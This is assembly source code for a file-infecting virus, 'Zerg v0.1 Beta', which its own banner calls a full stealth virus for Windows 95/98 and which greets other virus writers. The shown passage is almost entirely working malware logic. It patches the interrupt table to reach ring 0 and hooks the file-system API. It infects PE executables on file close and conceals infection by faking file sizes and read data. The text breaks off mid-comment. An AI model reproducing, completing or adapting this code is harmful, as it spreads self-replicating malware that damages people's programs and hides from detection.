   infected_sign   =       'DS'

   ; for test
   remove_sign     equ     'BYE'

   include         vxd.inc
   include         vmm.inc
   include         ifs.inc
   include         ifsext.inc
   include         filehead.inc
   include         Zerg.inc

   vir_size        equ     (vir_end-start)
   vir_file_size   equ     (vir_file_end-start)
   vir_mem_size    equ     (vir_mem_end-start)

                   .386p
                   .model  flat
                   .code

   start:          push    dword ptr 0     ; for return host
                   pushfd
                   pushad
   run_host:       call    _delta
   _delta:         pop     ecx
                   sub     ecx,_delta-start
                   xor     ecx,eax
                   jecxz   under_win95
                   xor     ecx,eax
                   mov     eax,-(ret_-start)
   vir_entry_point equ     dword ptr ($-4)
                   neg     eax
                   add     eax,ecx
                   add     eax,ds:[host_data ptr (ecx+HostData-start).pe_inhs. \
                                     OptionalHeader.AddressOfEntryPoint]
                   mov     ss:[pfad ptr esp.pfad_eax],eax
                   mov     ss:[pfad ptr esp.pfad_ret],eax
                   popad
                   popfd
   ret_:           ret

   seh:            xor     ecx,ecx
                   mov     ebx,fs:[ecx]
                   mov     esp,ds:[ebx]
   remove_seh:     pop     dword ptr fs:[ecx]
                   pop     eax
                   jmp     run_host

   under_win95:    lea     ebx,[seh+eax-start]
                   push    ebx
                   push    dword ptr fs:[ecx]
                   mov     fs:[ecx],esp

                   push    eax
                   sidt    fword ptr ss:[esp-2]
                   pop     ebx
                   lea     edx,[int0+eax-start]
                   ror     edx,16
                   xchg    dx,ds:[ebx+6]
                   ror     edx,16
                   xchg    dx,ds:[ebx]
                   div     cl
                   jmp     remove_seh


   msg             db      ' -=#[Zerg v0.1 Beta]#=- '
                   db      'The World First Full Stealth virus for Win95/98, '
                   db      'Written by Dark Slayer in Keelung, Taiwan (ROC). '
                   db      'This is a Demo and Lame virus. '
                   db      "It's Show that How to Make a Full Stealth virus on "
                   db      'IFSMgr, and Directly Call into FSD '
                   db      'without the Fucking IFSMgr_Ring0_FileIO. '
                   db      "It's not Finished yet at All, "
                   db      'Keeping watch My Next virus, Next Generation... '
                   db      "It'll be A Partition/BOOT/COM/EXE/NEXE/PEXE/"
                   db      'Polymorphic/Full Stealth/Multi-Platform Infector. '
                   db      'Greeting to all Virus Writer, '
                   db      'Bye! ^_^ '


   int0:           pushad
                   push    ds es
                   push    ss ss
                   pop     ds es

                   mov     ds:[ebx],dx
                   ror     edx,16
                   mov     ds:[ebx+6],dx

                   xchg    esi,eax

                   push    vir_mem_size
   VxDCall0:       VxDCall IFSMgr_GetHeap
                   pop     ecx
                   or      eax,eax
                   jz      int0_exit

                   xchg    edi,eax
                   cld
                   rep     movsb

                   lea     eax,[edi-vir_mem_size+IFSHook-start]
                   push    eax
   VxDCall1:       VxDCall IFSMgr_InstallFileSystemApiHook
                   pop     ebx
                   or      eax,eax
                   jz      int0_retHeap_exit
                   mov     ds:[edi-vir_mem_size+prevIFSHookAddr-start],eax

                   lea     eax,[edi-vir_mem_size+IFSMgrIFSApiHook-start]
                   mov     ebx,ds:[esi-vir_mem_size+VxDCall1+2-start]
                   xchg    eax,ds:[ebx]
                   mov     ds:[edi-vir_mem_size+IFSMgrIFSApiHookAddr-start],eax


                   ; follow line for test remove function
                   ;mov     ds:[edi-vir_mem_size+remove_addr-start],ebx


   int0_exit:      pop     es ds
                   popad
                   add     dword ptr ss:[esp],2
                   iretd

   int0_retHeap_exit:
                   sub     edi,vir_mem_size
                   push    edi
   VxDCall2:       VxDCall IFSMgr_RetHeap
                   pop     eax
                   jmp     int0_exit


   IFSMgrIFSApiHook:
                   push    ebx ecx


                   ; for test
                   mov     ebx,ss:[esp+3*4]
                   cmp     dword ptr ss:[ebx-4],remove_sign
                   jne     not_remove
                   call    _deltaX
   _deltaX:        pop     ebx

   ;                mov     ecx,0
   ;remove_addr     =       dword ptr $-4
   ;                mov     eax,ds:[ebx+IFSMgrIFSApiHookAddr-_deltaX]
   ;                mov     ds:[ecx],eax

                   lea     eax,[ebx+IFSHook-_deltaX]
                   push    eax
                   VxDCall IFSMgr_RemoveFileSystemApiHook
                   pop     eax
                   mov     eax,remove_sign
                   jmp     IFSMgrIFSApiHookRet
   not_remove:


                   mov     ebx,ss:[esp+3*4]
                   cmp     dword ptr ss:[ebx-4],infected_sign
                   jne     not_me
                   xor     eax,eax
                   jmp     IFSMgrIFSApiHookRet

   not_me:         call    _delta1
   _delta1:        pop     ebx
                   lea     eax,[ebx+IFSHook-_delta1]
                   push    eax
   VxDCall3:       VxDCall IFSMgr_RemoveFileSystemApiHook
                   mov     ebx,0
   IFSMgrIFSApiHookAddr =  dword ptr $-4
                   push    dword ptr ss:[esp+4*4]
                   call    ebx
                   pop     ecx
                   pop     ecx
                   push    eax
                   push    ecx
                   call    ebx
                   pop     ebx
                   mov     ds:[ebx+prevIFSHookAddr-IFSHook],eax
                   pop     eax
   IFSMgrIFSApiHookRet:
                   pop     ecx ebx
                   ret


   tsr_sign        dd      infected_sign

   IFSHook         proc    c,FSDFnAddr:dword,FunctionNum:dword,Drive:dword, \
                             ResourceFlags:dword,CodePage:dword,pir:dword
                   local   pifshp:dword
                   pushfd
                   pushad
                   mov     ss:pifshp,0

                   mov     eax,ss:FunctionNum
                   cmp     al,IFSFN_CLOSE          ; infect
                   je      FuncCloseFile
                   cmp     al,IFSFN_FINDOPEN       ; stealth size
                   je      FuncFindFile
                   cmp     al,IFSFN_FINDNEXT       ; stealth size
                   je      FuncFindFile
                   cmp     al,IFSFN_READ           ; stealth data
                   je      FuncReadFile
                   cmp     al,IFSFN_WRITE          ; disinfect file
                   je      FuncWriteFile
                   cmp     al,IFSFN_OPEN        ; stealth size & modify open mode
                   je      FuncOpenFile
                   cmp     al,IFSFN_SEARCH         ; stealth size
                   je      FuncSearchFile
                   cmp     al,IFSFN_SEEK           ; stealth size
                   je      FuncFileSeek
                   cmp     al,IFSFN_ENUMHANDLE     ; stealth size
                   je      FuncEnumerateHandle

   toNextIFSHook:  call    RetIfshp
                   popad
                   popfd
                   call    prevIFSHook
                   ret

   returnIFSHook:  call    RetIfshp
                   popad
                   popfd
                   ret
   IFSHook         endp


   prevIFSHook:    pushfd
                   pushad
                   mov     eax,0
   prevIFSHookAddr =       dword ptr $-4
                   call    [eax] c,FSDFnAddr,FunctionNum,Drive, \
                                   ResourceFlags,CodePage,pir
                   mov     ss:[pfad ptr esp.pfad_eax],eax
                   popad
                   popfd
                   ret


   FuncWriteFile:  call    GetIfshp
                   jc      toNextIFSHook

                   xchg    edi,eax
                   lea     ebx,[ifshp ptr edi.our_ifsreq]
                   call    CheckHandle
                   jc      toNextIFSHook
                   or      eax,eax
                   jz      toNextIFSHook

                   call    WriteInfectedData
                   jmp     toNextIFSHook


   FuncEnumerateHandle:
                   mov     ecx,ss:pir
                   cmp     ds:[ioreq ptr ecx.ir_flags],ENUMH_GETFILEINFO
                   jne     toNextIFSHook

                   call    GetIfshp
                   jc      toNextIFSHook

                   xchg    edi,eax
                   lea     ebx,[ifshp ptr edi.our_ifsreq]
                   call    CheckHandle
                   jc      toNextIFSHook
                   or      eax,eax
                   jz      toNextIFSHook

                   call    prevIFSHook
                   mov     ss:[pfad ptr esp.pfad_eax],eax
                   movzx   eax,ds:[ioreq ptr ecx.ir_error]
                   or      eax,eax
                   jnz     returnIFSHook

                   mov     edx,ds:[ioreq ptr ecx.ir_data]
                   mov     eax,ds:[ifshp ptr edi.hdat.FileSize]
                   mov     ds:[_BY_HANDLE_FILE_INFORMATION ptr edx. \
                                                           bhfi_nFileSizeLow],eax
                   jmp     returnIFSHook


   FuncFileSeek:   mov     ecx,ss:pir
                   cmp     ds:[ioreq ptr ecx.ir_flags],FILE_END
                   jne     toNextIFSHook

                   call    GetIfshp
                   jc      toNextIFSHook

                   xchg    edi,eax
                   lea     ebx,[ifshp ptr edi.our_ifsreq]
                   call    CheckHandle
                   jc      toNextIFSHook
                   or      eax,eax
                   jz      toNextIFSHook

                   mov     ds:[ioreq ptr ecx.ir_flags],FILE_BEGIN
                   mov     eax,ds:[ifshp ptr edi.hdat.FileSize]
                   add     ds:[ioreq ptr ecx.ir_pos],eax

                   call    prevIFSHook
                   mov     ss:[pfad ptr esp.pfad_eax],eax
                   movzx   eax,ds:[ioreq ptr ecx.ir_error]
                   or      eax,eax
                   jnz     returnIFSHook

                   mov     ds:[ioreq ptr ecx.ir_flags],FILE_END
                   jmp     returnIFSHook


   FuncSearchFile: call    prevIFSHook
                   mov     ss:[pfad ptr esp.pfad_eax],eax
                   mov     eax,ss:pir
                   movzx   eax,ds:[ioreq ptr eax.ir_error]
                   or      eax,eax
                   jnz     returnIFSHook

                   call    GetIfshp
                   jc      returnIFSHook

                   xchg    edi,eax
                   lea     ebx,[ifshp ptr edi.our_ifsreq]
                   mov     eax,ds:[ioreq ptr ebx.ir_data]
                   test    ds:[srch_entry ptr eax.se_attrib], \
                             FILE_ATTRIBUTE_LABEL or FILE_ATTRIBUTE_DIRECTORY or \
                             FILE_ATTRIBUTE_DEVICE
                   jnz     returnIFSHook

                   lea     eax,[srch_entry ptr eax.se_name]
                   mov     ds:[ioreq ptr ebx.ir_data],eax
                   lea     eax,[ifshp ptr edi.UniPath]
                   mov     ds:[ioreq ptr ebx.ir_ppath],eax
                   mov     ds:[ifsreq ptr ebx.ifs_pbuffer],eax
                   mov     ds:[ifsreq ptr ebx.ifs_nflags],BCS_OEM
                   push    ebx
   VxDCall8:       VxDCall IFSMgr_ParsePath
                   pop     ebx
                   movzx   eax,ds:[ioreq ptr ebx.ir_error]
                   or      eax,eax
                   jnz     returnIFSHook

                   mov     al,ACCESS_READONLY or SHARE_DENYNONE
                   call    OpenFile
                   jc      returnIFSHook

                   call    CheckHandle
                   jc      SearchCloseFile
                   or      eax,eax
                   jz      SearchCloseFile

                   mov     ecx,ss:pir
                   mov     eax,ds:[ioreq ptr ecx.ir_data]
                   mov     edx,ds:[ifshp ptr edi.hdat.FileSize]
                   mov     ds:[srch_entry ptr eax.se_size],edx

   SearchCloseFile:call    CloseFile
                   jmp     returnIFSHook


   FuncFindFile:   call    prevIFSHook
                   mov     ss:[pfad ptr esp.pfad_eax],eax
                   mov     eax,ss:pir
                   movzx   eax,ds:[ioreq ptr eax.ir_error]
                   or      eax,eax
                   jnz     returnIFSHook

                   call    GetIfshp
                   jc      returnIFSHook

                   xchg    edi,eax
                   lea     ebx,ds:[ifshp ptr edi.our_ifsreq]
                   mov     eax,ds:[ioreq ptr ebx.ir_data]
                   test    ds:[_WIN32_FIND_DATA ptr eax.dwFileAttributes], \
                             FILE_ATTRIBUTE_LABEL or FILE_ATTRIBUTE_DIRECTORY or \
                             FILE_ATTRIBUTE_DEVICE
                   jnz     returnIFSHook

                   lea     eax,[ifshp ptr edi.UniPath]
                   call    GetFindInfoByHandle
                   jc      returnIFSHook

   FuncFindOpen:   mov     al,ACCESS_READONLY or SHARE_DENYNONE
                   call    OpenFile
                   jc      returnIFSHook

                   call    CheckHandle
                   jc      FindCloseFile
                   or      eax,eax
                   jz      FindCloseFile

                   mov     ecx,ss:pir
                   mov     edx,ds:[ifshp ptr edi.hdat.FileSize]
                   mov     eax,ds:[ioreq ptr ecx.ir_data]
                   mov     ds:[_WIN32_FIND_DATA ptr eax.nFileSizeLow],edx

   FindCloseFile:  call    CloseFile
                   jmp     returnIFSHook


   FuncOpenFile:   mov     ecx,ss:pir
                   test    ds:[ioreq ptr ecx.ir_options],ACTION_OPENEXISTING
                   jz      toNextIFSHook
                   mov     al,ds:[ioreq ptr ecx.ir_flags]
                   and     al,ACCESS_MODE_MASK
                   cmp     al,ACCESS_WRITEONLY
                   jne     DoOpenFile
                   or      al,ACCESS_READWRITE
                   xor     ds:[ioreq ptr ecx.ir_flags],al
   DoOpenFile:     call    prevIFSHook
                   mov     ss:[pfad ptr esp.pfad_eax],eax
                   movzx   eax,ds:[ioreq ptr ecx.ir_error]
                   or      eax,eax
                   jnz     returnIFSHook

                   cmp     ds:[ioreq ptr ecx.ir_options],ACTION_OPENED
                   jne     returnIFSHook

                   call    GetIfshp
                   jc      returnIFSHook

                   xchg    edi,eax
                   lea     ebx,[ifshp ptr edi.our_ifsreq]
                   call    CheckHandle
                   jc      returnIFSHook
                   or      eax,eax
                   jz      returnIFSHook

                   mov     eax,ds:[ifshp ptr edi.hdat.FileSize]
                   mov     ds:[ioreq ptr ecx.ir_size],eax
                   jmp     returnIFSHook


   FuncReadFile:   call    GetIfshp
                   jc      toNextIFSHook

                   xchg    edi,eax
                   lea     ebx,[ifshp ptr edi.our_ifsreq]
                   call    CheckHandle
                   jc      toNextIFSHook
                   or      eax,eax
                   jz      toNextIFSHook

                   mov     ecx,ss:pir
                   mov     edx,ds:[ioreq ptr ecx.ir_pos]
                   sub     edx,ds:[ifshp ptr edi.hdat.FileSize]
                   jb      ReadPosInFile
                   xor     edx,edx
                   jmp     DoRead
   ReadPosInFile:  neg     edx
   DoRead:         cmp     edx,ds:[ifshp ptr ecx.ir_length]
                   jbe     FixReadSize
                   mov     edx,ds:[ifshp ptr ecx.ir_length]
   FixReadSize:    xchg    edx,ds:[ifshp ptr ecx.ir_length]

                   mov     ebx,ds:[ioreq ptr ecx.ir_data]
                   mov     esi,ds:[ioreq ptr ecx.ir_pos]
                   call    prevIFSHook
                   mov     ss:[pfad ptr esp.pfad_eax],eax
                   movzx   eax,ds:[ioreq ptr ecx.ir_error]
                   or      eax,eax
                   jz      StealthReadData
                   mov     ds:[ifshp ptr ecx.ir_length],edx
                   jmp     returnIFSHook

   StealthReadData:mov     edx,esi
                   lea     esi,[ifshp ptr edi.hdat.eh_st]
                   mov     edi,ebx
                   mov     ecx,ds:[ioreq ptr ecx.ir_length]

                   cld
   ReadStealthLoop:or      ecx,ecx
                   jz      returnIFSHook
                   xor     eax,eax
                   lodsw           ; load st_size
                   or      eax,eax
                   jz      returnIFSHook
                   xchg    ebx,eax
                   lodsd           ; load_st_pt
                   xchg    ebx,eax ; eax = st_size, ebx = st_pt

                   sub     ebx,edx
                   jbe     DoStealthData
                   sub     ecx,ebx
                   jbe     returnIFSHook
                   add     edx,ebx
                   add     edi,ebx
                   xor     ebx,ebx
   DoStealthData:  push    esi
                   sub     esi,ebx
                   add     ebx,eax
                   js      DoNextStealthData
                   jz      DoNextStealthData

                   push    ecx
                   cmp     ebx,ecx
                   jbe     MoveStealthData
                   mov     ebx,ecx
   MoveStealthData:mov     ecx,ebx
                   rep     movsb
                   pop     ecx
                   sub     ecx,ebx
                   add     edx,ebx

   DoNextStealthData:
                   pop     esi
                   add     esi,eax
                   jmp     ReadStealthLoop


   FuncCloseFile:  call    GetIfshp
                   jc      toNextIFSHook

                   lea     ebx,ds:[ifshp ptr eax.our_ifsreq]
                   lea     esi,ds:[ifshp ptr eax.UniPath]
                   mov     ecx,size szPathName
                   lea     edi,ds:[ifshp ptr eax.szPathName]
                   call    GetFileNameByHandle
                   jc      toNextIFSHook
                   mov     edi,ss:pifshp
                   mov     ds:[ifshp ptr edi.PathNameSize],eax

                   lea     ecx,ds:[ifshp ptr edi.szPathName+eax]
                   mov     eax,ds:[ecx-4]  ; get extend name
                   or      eax,20202000h   ; lower case
                   cmp     eax,'exe.'
                   ;jne     toNextIFSHook

                   call    prevIFSHook
                   mov     ss:[pfad ptr esp.pfad_eax],eax
                   mov     eax,ss:pir
                   movzx   eax,ds:[ioreq ptr eax.ir_error]
                   or      eax,eax
                   jnz     returnIFSHook

                   mov     edi,ss:pifshp
                   lea     ebx,ss:[ifshp ptr edi.our_ifsreq]
                   mov     al,ACCESS_READONLY or SHARE_DENYNONE
                   call    OpenFile
                   jc      returnIFSHook

                   mov     eax,ds:[ioreq ptr ebx.ir_attr]
                   mov     ds:[ifshp ptr edi.FileAttributes],eax
                   mov     eax,ds:[ioreq ptr ebx.ir_dostime]
                   mov     ds:[ifshp ptr edi.FileDateTime],eax
                   mov     eax,ds:[ioreq ptr ebx.ir_size]
                   mov     ds:[ifshp ptr edi.hdat.FileSize],eax

                   call    InfectHandle
                   pushfd
                   call    CloseFile
                   pop     eax
                   jc      returnIFSHook
                   test    eax,CFbit
                   jnz     returnIFSHook

                   mov     eax,ds:[ifshp ptr edi.FileAttributes]
                   and     eax,not FILE_ATTRIBUTE_READONLY
                   call    SetFileAttributes
                   jc      returnIFSHook

                   mov     al,ACCESS_READWRITE or SHARE_DENYREADWRITE
                   call    OpenFile
                   jc      restoreFileAttr

                   call    WriteInfectedData

                   mov     eax,ds:[ifshp ptr edi.FileDateTime]
                   call    SetFileDateTime
                   call    CloseFile

   restoreFileAttr:mov     eax,ds:[ifshp ptr edi.FileAttributes]
                   call    SetFileAttributes
                   jmp     returnIFSHook


   WriteInfectedData:
                   stc
                   pushfd
                   pushad

                   mov     edi,ss:pifshp
                   lea     ebx,ss:[ifshp ptr edi.our_ifsreq]

                   lea     esi,[ifshp ptr edi.hdat.eh_st+size st]
   write_loop:     movzx   ecx,ds:[st ptr (esi-size st).st_size]
                   jcxz    write_body
                   mov     edx,ds:[st ptr (esi-size st).st_pt]
                   call    WriteFile
                   jc      WriteInfectedDataErr
                   cmp     eax,ecx
                   jne     WriteInfectedDataErr
                   lea     esi,[esi+eax+size st]
                   jmp     write_loop

   write_body:     mov     ecx,vir_file_size
                   lea     esi,[ifshp ptr edi.VirData]
                   cmp     dword ptr ds:[esi],0
                   je      for_disinfect
                   mov     edx,ds:[host_data ptr (esi+HostData-start).FileSize]
                   call    WriteFile
                   jc      WriteInfectedDataErr
                   cmp     eax,ecx
                   jne     WriteInfectedDataErr

   for_disinfect:  xor     ecx,ecx
                   mov     edx,ds:[ifshp ptr edi.hdat.FileSize]
                   call    WriteFile
                   jc      WriteInfectedDataErr
                   cmp     eax,ecx
                   jne     WriteInfectedDataErr

                   and     ss:[pfad ptr esp.pfad_eflags],not CFbit
   WriteInfectedDataErr:
                   popad
                   popfd
                   ret


   ; infect file by handle
   ;   entry:
   ;     ebx = pointer to the ifsreq
   InfectHandle:   clc
                   pushfd
                   pushad

                   call    CheckHandle
                   jc      InfectHandleErr ; error
                   or      eax,eax
                   jnz     InfectHandleErr

                   mov     edi,ss:pifshp
                   cmp     ds:[ifshp ptr edi.eh.eh_sign],IMAGE_DOS_SIGNATURE
                   jne     InfectHandleErr ; checks for 'MZ' sign

                   mov     ecx,size pe_inhs
                   mov     edx,ds:[ifshp ptr edi.hdat.eh.eh_neh_ofs]
                   lea     esi,ds:[ifshp ptr edi.hdat.pe_inhs]
                   call    SetST&ReadFile
                   jc      InfectHandleErr
                   cmp     eax,ecx
                   jne     InfectHandleErr

                   cmp     ds:[pe_inhs ptr esi.Signature],IMAGE_NT_SIGNATURE
                   jne     InfectHandleErr ; chkecks for 'PE' sign

                   call    InfectPEXE
                   jnc     InfectHandleOk
   InfectHandleErr:or      ss:[pfad ptr esp.pfad_eflags],CFbit
   InfectHandleOk: popad
                   popfd
                   ret


   ; infect Portable Executable file by handle
   ;   entry:
   ;     ebx = pointer to the ifsreq
   InfectPEXE:     clc
                   pushfd
                   pushad

                   mov     edi,ss:pifshp
                   cmp     ds:[ifshp ptr edi.hdat.pe_inhs.FileHeader.Machine], \
                             IMAGE_FILE_MACHINE_I386    ; checks for 386 platform
                   jne     InfectPExeErr

                   mov     ax,ds:[ifshp ptr edi.hdat.pe_inhs.FileHeader. \
                                                               Characteristics]
                   test    ax,IMAGE_FILE_SYSTEM or \
                              IMAGE_FILE_DLL       ; checks for dll or system file
                   jnz     InfectPExeErr
                   not     eax
                   test    ax,IMAGE_FILE_EXECUTABLE_IMAGE or \
                              IMAGE_FILE_32BIT_MACHINE
                   jnz     InfectPExeErr

                   cmp     ds:[ifshp ptr edi.hdat.pe_inhs.OptionalHeader.Magic], \
                             IMAGE_NT_OPTIONAL_HDR_MAGIC
                   jne     InfectPExeErr

                   mov     ax,ds:[ifshp ptr edi.hdat.pe_inhs.OptionalHeader. \
                                                               Subsystem]
                   cmp     al,IMAGE_SUBSYSTEM_WINDOWS_GUI
                   je      SubsystemOK
                   cmp     al,IMAGE_SUBSYSTEM_WINDOWS_CUI
                   jne     InfectPExeErr   ; neither GUI nor CUI, bye!
   SubsystemOK:
                   movzx   eax,ds:[ifshp ptr edi.hdat.pe_inhs.FileHeader. \
                                                                NumberOfSections]
                   dec     eax
                   js      InfectPExeErr
                   mov     ecx,size IMAGE_SECTION_HEADER
                   mul     ecx
                   movzx   edx,ds:[ifshp ptr edi.hdat.pe_inhs.FileHeader. \
                                   SizeOfOptionalHeader]
                   add     edx,size Signature+size FileHeader
                   add     edx,eax
                   add     edx,ds:[ifshp ptr edi.hdat.eh.eh_neh_ofs]
                   lea     esi,ds:[ifshp ptr edi.hdat.pe.pe_ish]
                   call    SetST&ReadFile
                   jc      InfectPExeErr
                   cmp     eax,ecx
                   jne     InfectPExeErr

                   mov     ecx,ds:[ifshp ptr edi.hdat.pe_inhs.OptionalHeader. \
                                                                SectionAlignment]
                   xor     edx,edx
                   mov     eax,ds:[pe_ish ptr esi.Misc.VirtualSize]
                   div     ecx
                   cmp     edx,1   ; remainder?
                   cmc
                   adc     eax,0
                   mul     ecx
                   add     eax,ds:[pe_ish ptr esi.VirtualAddress]
                   cmp     eax,ds:[ifshp ptr edi.hdat.pe_inhs.OptionalHeader. \
                                                                SizeOfImage]
                   jne     InfectPExeErr

                   mov     eax,ds:[pe_ish ptr esi.Misc.VirtualSize]
                   sub     eax,ds:[pe_ish ptr esi.SizeOfRawData]
                   jae     CheckFileSize
                   neg     eax
   CheckFileSize:  cmp     eax,ecx
                   jae     InfectPExeErr

                   mov     eax,ds:[ifshp ptr edi.hdat.FileSize]
                   sub     eax,ds:[pe_ish ptr esi.PointerToRawData]
                   sub     eax,ds:[pe_ish ptr esi.SizeOfRawData]
                   cmp     eax,ecx
                   jae     InfectPExeErr

                   xor     edx,edx
                   mov     eax,ds:[pe_ish ptr esi.VirtualAddress]
                   or      eax,eax
                   jz      InfectPExeErr
                   div     ecx
                   or      edx,edx
                   jnz     InfectPExeErr

                   mov     ecx,ds:[ifshp ptr edi.hdat.pe_inhs.OptionalHeader. \
                                                                FileAlignment]
                   mov     eax,ds:[ifshp ptr edi.hdat.FileSize]
                   div     ecx
                   or      edx,edx
                   jnz     InfectPExeErr

                   mov     eax,ds:[pe_ish ptr esi.SizeOfRawData]
                   or      eax,eax
                   jz      InfectPExeErr
                   div     ecx
                   or      edx,edx
                   jnz     InfectPExeErr

                   mov     eax,ds:[pe_ish ptr esi.PointerToRawData]
                   or      eax,eax
                   jz      InfectPExeErr
                   div     ecx
                   or      edx,edx
                   jnz     InfectPExeErr

                   mov     eax,ds:[pe_ish ptr esi.SectionCharacteristics]
                   test    eax,IMAGE_SCN_CNT_UNINITIALIZED_DATA or \
                               IMAGE_SCN_MEM_16BIT
                   jnz     InfectPExeErr

                   mov     ds:[ifshp ptr edi.hdat.InfectedSign],infected_sign
                   mov     ds:[ifshp ptr edi.hdat.pe_last],0


                   xchg    edi,eax
                   call    _delta2
   _delta2:        pop     esi
                   sub     esi,_delta2-start
                   lea     edi,[ifshp ptr eax.VirData]
                   mov     ecx,vir_size
                   cld
                   rep     movsb

                   mov     ecx,VxDCall_tbl_size/4
   patch_VxDCall:  mov     edx,ds:[edi-vir_size+VxDCall_tbl-start+(ecx-1)*4]
                   sub     edx,offset start
                   mov     word ptr ds:[edi-vir_size+edx],20cdh
                   push    dword ptr ds:[edi-vir_size+edx+8]
                   pop     dword ptr ds:[edi-vir_size+edx+2]
                   loop    patch_VxDCall

                   lea     esi,[ifshp ptr eax.hdat]
                   mov     cx,size hdat
                   rep     movsb
                   xchg    edi,eax


                   mov     ds:[ifshp ptr edi.hdat.eh.eh_checksum],infected_sign

                   mov     eax,ds:[ifshp ptr edi.hdat.FileSize]
                   sub     eax,ds:[ifshp ptr edi.hdat.pe_ish.PointerToRawData]
                   lea     edx,[eax+vir_file_size]
                   mov     ds:[ifshp ptr edi.hdat.pe_ish.Misc.VirtualSize],edx

                   add     eax,ds:[ifshp ptr edi.hdat.pe_ish.VirtualAddress]
                   mov     ds:[ifshp ptr edi.hdat.pe_inhs.OptionalHeader. \
                                                          AddressOfEntryPoint],eax
                   mov     dword ptr ds:[ifshp ptr edi.VirData+vir_entry_point- \
                                                                 start],eax

                   mov     ecx,ds:[ifshp ptr edi.hdat.pe_inhs.OptionalHeader. \
                                                                SectionAlignment]
                   xchg    edx,eax
                   xor     edx,edx
                   add     eax,ds:[ifshp ptr edi.hdat.pe_ish.VirtualAddress]
                   div     ecx
                   cmp     edx,1
                   cmc
                   adc     eax,0
                   mul     ecx
                   mov     ds:[ifshp ptr edi.hdat.pe_inhs.OptionalHeader. \
                                                            SizeOfImage],eax

                   mov     ecx,ds:[ifshp ptr edi.hdat.pe_inhs.OptionalHeader. \
                                                                FileAlignment]
                   xor     edx,edx
                   mov     eax,ds:[ifshp ptr edi.hdat.pe_ish.Misc.VirtualSize]
                  ;div     ecx
                  ;cmp     edx,1
                  ;cmc
                  ;adc     eax,0
                  ;mul     ecx
                  ; for test bugs
                   mov     ds:[ifshp ptr edi.hdat.pe_ish.SizeOfRawData],eax

                   add     eax,ds:[ifshp ptr edi.hdat.pe_ish.PointerToRawData]
                   mov     ds:[ifshp ptr edi.hdat.FileSize],eax

                   or      ds:[ifshp ptr edi.hdat.pe_ish.SectionCharacteristics], \
                             IMAGE_SCN_CNT_CODE or IMAGE_SCN_MEM_EXECUTE or \
                             IMAGE_SCN_MEM_READ
                   jmp     InfectPExeOk

   InfectPExeErr:  or      ss:[pfad ptr esp.pfad_eflags],CFbit
   InfectPExeOk:   popad
                   popfd
                   ret


   ; check handle for infected or not
   ;   entry:
   ;     ebx = pointer to the ifsreq
   ;   return:
   ;     CFlag = 0 (no error)
   ;       eax == 0 -> not infected
   ;       eax >  0 -> infected
   ;     CFlag = 1 (error)
   CheckHandle:    clc
                   pushfd
                   pushad

                   mov     ecx,size eh
                   xor     edx,edx
                   mov     esi,ss:pifshp
                   lea     esi,[ifshp ptr esi.hdat.eh]
                   call    SetST&ReadFile
                   jc      CheckHandleRetC
                   sub     eax,ecx
                   jnz     CheckHandleRetC

                   cmp     ds:[eh ptr esi.eh_checksum],infected_sign
                   jne     CheckHandleSaveEAX

                   call    GetFileSizeByHandle
                   jc      CheckHandleRetC

                   mov     ecx,size hdat
                   lea     edx,[eax-size hdat]
                   lea     esi,[ifshp ptr (esi-hdat.eh).hdat]
                   call    ReadFile
                   jc      CheckHandleRetC
                   cmp     eax,ecx
                   jne     CheckHandleRetC

                   xor     eax,eax
                   cmp     ds:[hdat ptr esi.InfectedSign],infected_sign
                   jne     CheckHandleSaveEAX
                   inc     eax
   CheckHandleSaveEAX:
                   mov     ss:[pfad ptr esp.pfad_eax],eax
   CheckHandleRet: popad
                   popfd
                   ret
   CheckHandleRetC:or      ss:[pfad ptr esp.pfad_eflags],CFbit
                   jmp     CheckHandleRet


   ; get hndlfunc structure
   ;   entry:
   ;     ebx = pointer to the ifsreq
   ;   return:
   ;     eax = return the pointer of hndlfunc structure
   GetHndlfunc:    mov     eax,ss:pifshp
                   or      eax,eax
                   jz      GetHndlfuncFromIfsreq
                   lea     eax,[ifshp ptr eax.our_hfunc]
                   cmp     dword ptr ds:[eax],0
                   je      GetHndlfuncFromIfsreq
                   ret

   GetHndlfuncFromIfsreq:
                   mov     eax,ds:[ifsreq ptr ebx.ifs_pfh]
                   lea     eax,[fhandle ptr eax.fh_hf]
                   ret


   ; get file size by handle
   ;   entry:
   ;     ebx = pointer to the ifsreq
   ;   return:
   ;     CFlag = 0 (no error)
   ;       eax = returns the size of file
   ;     CFlag = 1 (error)
   ;       eax = error code
   GetFileSizeByHandle:
                   pushfd
                   pushad
                   mov     ds:[ioreq ptr ebx.ir_flags],FILE_END
                   mov     ds:[ioreq ptr ebx.ir_pos],0

                   call    GetHndlfunc
                   mov     eax,ds:[hndlfunc ptr eax.hf_misc]
                   push    ebx
                   call    ds:[hndlmisc ptr eax.hm_func+HM_SEEK*4]
                   pop     ebx

                   movzx   eax,ds:[ioreq ptr ebx.ir_error]
                   cmp     eax,1
                   sbb     ecx,ecx
                   inc     ecx
                   and     ss:[pfad ptr esp.pfad_eflags],not CFbit
                   or      ss:[pfad ptr esp.pfad_eflags],ecx
                   dec     ecx
                   jz      GetSizeDone

                   mov     eax,ds:[ioreq ptr ebx.ir_pos]
   GetSizeDone:    mov     ss:[pfad ptr esp.pfad_eax],eax
                   popad
                   popfd
                   ret


   ; get heap for ifshp
   ;   return:
   ;     CFlag = 0 (no error)
   ;       eax = pointer to the ifshp
   ;     CFlag = 1 (error)
   ;       eax = 0
   GetIfshp:       pushfd
                   pushad
                   push    size ifshp
   VxDCall4:       VxDCall IFSMgr_GetHeap
                   pop     ecx
                   or      eax,eax
                   jz      GetIfshpDone
                   mov     ss:pifshp,eax

                   mov     ebx,eax
                   xchg    edi,eax
                   xor     eax,eax
                   cld
                   rep     stosb

                   mov     esi,pir
                   lea     edi,[ifshp ptr ebx.our_ifsreq]
                   mov     ecx,size ifsreq
                   rep     movsb
   GetIfshpDone:   cmp     ss:pifshp,1
                   sbb     ecx,ecx
                   and     ecx,CFbit
                   and     ss:[pfad ptr esp.pfad_eflags],not CFbit
                   or      ss:[pfad ptr esp.pfad_eflags],ecx
                   popad
                   popfd
                   mov     eax,ss:pifshp
                   ret


   ; ret heap of ifshp
   ; return: none
   RetIfshp:       pushfd
                   pushad
                   mov     ecx,ss:pifshp
                   jecxz   RetIfshpDone
                   push    ecx
   VxDCall5:       VxDCall IFSMgr_RetHeap
                   pop     ecx
                   mov     ss:pifshp,0
   RetIfshpDone:   popad
                   popfd
                   ret


   ; get find info by handle
   ;   entry:
   ;     ebx = pointer to the ifsreq
   ;     eax = pointer to a buffer the unicode pathname in the ParsedPath
